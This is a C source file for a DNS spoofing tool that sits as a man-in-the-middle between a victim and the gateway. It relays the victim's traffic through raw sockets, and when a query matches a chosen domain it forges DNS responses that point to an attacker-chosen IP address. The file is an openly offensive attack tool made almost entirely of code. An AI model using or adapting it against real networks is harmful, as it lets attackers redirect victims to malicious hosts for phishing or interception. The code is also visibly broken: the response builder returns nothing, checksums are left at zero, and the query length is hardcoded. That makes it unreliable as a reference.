#include "dnsspoof.h"
#include "utils.h"

void dns_pac_status(uint8_t* pac, char* qname){
    int i;
    uint8_t* dns_data = (uint8_t*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    struct ether_header *eth_hdr = (struct ether_header*) pac;
    struct iphdr *ip_hdr = (struct iphdr*) (pac + sizeof(struct ether_header));
    struct udphdr *udp_hdr = (struct udphdr*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr));
    struct dnshdr* dns_hdr = (struct dnshdr*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
    struct dnsquery* dns_query = (struct dnsquery*) (pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    fprintf(stderr, "\n\n____________________\n");
    fprintf(stderr, "ether_dhost: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *eth_hdr->ether_dhost, *(eth_hdr->ether_dhost+1), *(eth_hdr->ether_dhost+2), *(eth_hdr->ether_dhost+3), *(eth_hdr->ether_dhost+4), *(eth_hdr->ether_dhost+5));
    fprintf(stderr, "ether_shost: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", *eth_hdr->ether_shost, *(eth_hdr->ether_shost+1), *(eth_hdr->ether_shost+2), *(eth_hdr->ether_shost+3), *(eth_hdr->ether_shost+4), *(eth_hdr->ether_shost+5));
    fprintf(stderr, "ether_type: 0x%.4x\n", ntohs(eth_hdr->ether_type));
    fprintf(stderr, "___\n");
    fprintf(stderr, "version: %.4x, ihl: %.4x\n", ntohs(ip_hdr->version), ntohs(ip_hdr->ihl));
    fprintf(stderr, "tos: 0x%2x\n", ip_hdr->tos);
    fprintf(stderr, "tot_len: 0x%4x\n", ntohs(ip_hdr->tot_len));
    fprintf(stderr, "id: 0x%4x\n", ntohs(ip_hdr->id));
    fprintf(stderr, "frag_off: 0x%4x\n", ntohs(ip_hdr->frag_off));
    fprintf(stderr, "ttl: 0x%2x\n", ip_hdr->ttl);
    fprintf(stderr, "protocol: 0x%.2x\n", ip_hdr->protocol);
    fprintf(stderr, "check: 0x%.4x\n", ntohs( ip_hdr->protocol));
    fprintf(stderr, "saddr: %d.%d.%d.%d\n", *ip_hdr->saddr, *(ip_hdr->saddr+1), *(ip_hdr->saddr+2), *(ip_hdr->saddr+3));
    fprintf(stderr, "daddr: %d.%d.%d.%d\n", *ip_hdr->daddr, *(ip_hdr->daddr+1), *(ip_hdr->daddr+2), *(ip_hdr->daddr+3));
    fprintf(stderr, "___\n");
    fprintf(stderr, "sport: 0x%.4x\n", ntohs(udp_hdr->uh_sport));
    fprintf(stderr, "dport: 0x%.4x\n", ntohs(udp_hdr->uh_dport));
    fprintf(stderr, "len: 0x%.4x\n", ntohs(udp_hdr->len));
    fprintf(stderr, "check: 0x%.4x\n", ntohs(udp_hdr->check));
    fprintf(stderr, "___\n");
    fprintf(stderr, "TID: 0x%.4x\n", ntohs(dns_hdr->tid));
    fprintf(stderr, "Flags: 0x%.4x\n", ntohs(dns_hdr->flags));
    fprintf(stderr, "Questions: %d\n", ntohs(dns_hdr->questitons));
    fprintf(stderr, "Answer RRs: %d\n", dns_hdr->answer_rrs);
    fprintf(stderr, "Authority RRs: %d\n", dns_hdr->auth_rrs);
    fprintf(stderr, "Add RRs: %d\n", dns_hdr->add_rrs);
    fprintf(stderr, "___\nQname: %s\n", qname);
    fprintf(stderr, "____________________\n\n");

}
unsigned short cksum(uint16_t *buf, int len){
  unsigned long sum;
  for (sum = 0; len > 0; len--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

void extract_dns_request(uint8_t *query_data, uint8_t *request){
  unsigned int i, j, k;
  char *curr = query_data;
  unsigned int size;
  
  size = curr[0];

  j=0;
  i=1;
  while(size > 0){
    for(k=0; k<size; k++){
      request[j++] = curr[i+k];
    }
    request[j++]='.';
    i+=size;
    size = curr[i++];
  }
  request[--j] = '\0';
}


void modify_l2_hdr(uint8_t *ip_pac, uint8_t* sha, uint8_t* tha){
    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
    int i;
    for(i = 0;i<ETH_ALEN;i++){
        eth_hdr->ether_shost[i] = *(sha+i);
        eth_hdr->ether_dhost[i] = *(tha+i);
    }
}
uint8_t* construct_dns_response(uint8_t* ether_shost, uint8_t* ether_dhost, //l2hdr
                        uint16_t id, uint8_t protocol, uint8_t* saddr, uint8_t* daddr, //l3hdr
                        uint16_t uh_dport, uint16_t tid, //l4hdr
                        uint8_t* query_data,
                        uint8_t* ip_spoof) { 

    //all already in net byte order
    struct ether_header *eth_hdr = (struct ether_header*) malloc(sizeof(struct ether_header));
    int i;
    for(i = 0;i<ETH_ALEN;i++){
        eth_hdr->ether_shost[i] = *(ether_shost+i);
        eth_hdr->ether_dhost[i] = *(ether_dhost+i);
    }
    eth_hdr->ether_type = htons(ETHERTYPE_IP);


    struct iphdr *ip_hdr = (struct iphdr*) malloc(sizeof(struct iphdr));
    memset(ip_hdr, 0, sizeof(struct iphdr));
    ip_hdr->version = 4;
    ip_hdr->ihl = 5;
    ip_hdr->tos = 0x00;

    ip_hdr->id = htons(id);
    ip_hdr->frag_off = htons(0x0000);
    ip_hdr->ttl = 64;
    ip_hdr->protocol = protocol;
    for(i = 0; i< 4; i++){
        ip_hdr->saddr[i] = *(saddr+i);
        ip_hdr->daddr[i] = *(daddr+i);
    }
    ip_hdr->check = 0x0000; //////////////////////////////////////////////////////////////////// must be changed

    struct udphdr *udp_hdr = (struct udphdr*) malloc(sizeof(struct udphdr)); //8byte
        udp_hdr->uh_sport = htons(53);
        udp_hdr->uh_dport = uh_dport;
        udp_hdr->uh_ulen = htons(42); //////////////////////////////////////////////////////////////////// must be changed
        udp_hdr->check = 0x0000;    //////////////////////////////////////////////////////////////////// must be changed
    
    struct dnshdr *dns_hdr = (struct dnshdr*) malloc(sizeof(struct dnshdr));    //12byte + 22byte data query
    dns_hdr->tid = htons(tid);
    dns_hdr->flags = htons(0x8180); //Standard query response, no error
    dns_hdr->questitons = htons(0x0001);
    dns_hdr->answer_rrs = htons(0x0001);
    dns_hdr->auth_rrs = htons(0x0000);
    dns_hdr->add_rrs= htons(0x0000);

    struct dnsanswer *dns_answer = (struct dnsanswer*) malloc(sizeof(struct dnsanswer)); //10bytes
    dns_answer->qname_pointer = htons(0xc00c);
    dns_answer->type = htons(0x0001);
    dns_answer->class = htons(0x0001);
    dns_answer->ttl = htonl(60);
    dns_answer->data_len = htons(4);
    for(i=0;i< 4;i++)
        *(dns_answer->data+i) = *(ip_spoof+i);

    //cal checksum and len
    udp_hdr->len = htons( sizeof(struct udphdr) + sizeof(struct dnshdr) + 22 + sizeof(struct dnsanswer) );
    fprintf(stderr, "UDP Len: %d byte\n", ntohs(udp_hdr->len));
    //udp_hdr->uh_sum = cksum( (uint16_t*) udp_hdr, udp_hdr->len );


    ip_hdr->tot_len =  htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22 + sizeof(struct dnsanswer) );
    fprintf(stderr, "IP Len: %d byte\n", ntohs(ip_hdr->tot_len));
    //ip_hdr->check = cksum((uint16_t*) ip_hdr, sizeof(struct iphdr));


    uint8_t* dns_pac = malloc(IP_PACKET_LEN);
    memset(dns_pac, 0 , IP_PACKET_LEN);
    memcpy(dns_pac, eth_hdr, sizeof(struct ether_header));
    memcpy(dns_pac + sizeof(struct ether_header), ip_hdr, sizeof(struct iphdr));
    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr), udp_hdr, sizeof(struct udphdr));
    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr), dns_hdr, sizeof(struct dnshdr));
    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr), query_data, 22); //www.facebook.com type A class IN
    memcpy(dns_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22, dns_answer, sizeof(struct dnsanswer));
    fprintf(stderr, "Contruct fake dns response\n");
    for(i = 0; i< sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + 22 + sizeof(struct dnsanswer); i++){
        fprintf(stderr, "%.2x ", *(dns_pac+i));
    }
    fprintf(stderr, "\n");

}
void* target_to_gateway(void* args){
    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if(sock_ip < 0){
        fprintf(stderr, "Error in creating IP socket\n");
        exit(0);
    }
    attacking_args_t *argument = (attacking_args_t*) args;
    uint8_t* ip_pac = malloc(IP_PACKET_LEN);

    memset(ip_pac, 0 , IP_PACKET_LEN);
    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
    struct dnshdr* dns_hdr = (struct dnshdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) );
    uint8_t* query_data = (uint8_t*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    uint8_t* qname;
    qname = (uint8_t*) calloc(REQUEST_SIZE, sizeof(uint8_t));
    
    int byte_recv;
    int i;
    while(1){
        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
        if(byte_recv>0){
            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->saddr, argument->target_ip) && !compare_ip(ip_hdr->daddr, argument->my_ip)){

                if(ip_hdr->protocol == PROTOCOL_UDP && udp_hdr->uh_dport == ntohs(DNS_SERVICE_PORT)){

                    extract_dns_request(query_data, qname);
                    dns_pac_status(ip_pac, qname);
                    if(!strcmp(qname, argument->qname)){
                        //if matching, drop the query and send back the fake response
                        fprintf(stderr, "Query data:");
                        for(i = 0; i < byte_recv - (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr)); i++){
                            fprintf(stderr, "%.2x ", *(query_data+i));
                        }
                        fprintf(stderr, "\n");
                        fprintf(stderr, "!!!!!!!!!!!!!!!!!!!!MATCHING!!!!!!!!!!!!!!!!!!!\n");

                        uint8_t* dns_res = construct_dns_response(argument->gateway_mac, argument->target_mac,
                                                ip_hdr->id, ip_hdr->protocol, ip_hdr->daddr, ip_hdr->saddr, 
                                                udp_hdr->uh_sport, dns_hdr->tid,
                                                query_data,
                                                argument->ip_dns_fake);
                        for(i=0;i<10;i++){
                            if(!sendto(sock_ip, dns_res, 92, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                                fprintf(stderr, "Error in forwading\n");
                        }

                    }
                    else{
                        modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
                        if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                            fprintf(stderr, "Error in forwading\n");
                        //else
                            //fprintf(stderr, "Target -> Gateway\n");
                    }
                }else{
                    modify_l2_hdr(ip_pac, argument->my_mac, argument->gateway_mac);
                    if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                        fprintf(stderr, "Error in forwading\n");
                    //else
                        //fprintf(stderr, "Target -> Gateway\n");
                }
                
            }
        }
    }
}
void* gateway_to_target(void* args){
    int sock_ip = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if(sock_ip < 0){
        fprintf(stderr, "Error in creating IP socket\n");
        exit(0);
    }
    attacking_args_t *argument = (attacking_args_t*) args;
    uint8_t* ip_pac = malloc(IP_PACKET_LEN);

    memset(ip_pac, 0 , IP_PACKET_LEN);
    struct ether_header *eth_hdr = (struct ether_header*) ip_pac;
    struct iphdr *ip_hdr = (struct iphdr*) (ip_pac + sizeof(struct ether_header));
    struct udphdr *udp_hdr = (struct udphdr*) (ip_pac + sizeof(struct ether_header) + sizeof(struct iphdr));
    int byte_recv;
    int i;


    while(1){
        byte_recv = recvfrom(sock_ip, ip_pac, IP_PACKET_LEN, 0, NULL, NULL);
        if(byte_recv>0){
            if(compare_mac(eth_hdr->ether_dhost, argument->my_mac) && compare_ip(ip_hdr->daddr, argument->target_ip)){
                //printf("_________________________________\n");
                //pac_status(ip_pac);


                modify_l2_hdr(ip_pac, argument->my_mac, argument->target_mac);
                if(!sendto(sock_ip, ip_pac, byte_recv, 0, (struct sockaddr*) &(argument->socket_address), argument->addr_len))
                    fprintf(stderr, "Error in forwading\n");
                //else
                    //fprintf(stderr, "Gateway -> Target\n");
                
            }
        }
    }
}